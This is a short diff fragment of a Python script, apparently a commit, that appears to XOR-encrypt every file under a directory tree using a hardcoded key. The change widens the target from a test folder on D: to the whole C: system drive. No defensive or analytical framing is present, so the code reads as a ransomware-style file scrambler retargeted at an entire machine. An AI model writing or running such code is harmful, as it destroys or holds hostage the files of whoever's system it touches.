@@ -23,7 +23,7 @@ def xor_system(filepath, key):
         return error
 
 
-fpath = 'D:\\test' #mettre le path voulu
+fpath = 'C:\\' #Put the path you want 
 key = 'azeAZE+!aze'
 if os.path.exists(fpath):
     for root, dirs, files in os.walk(fpath):
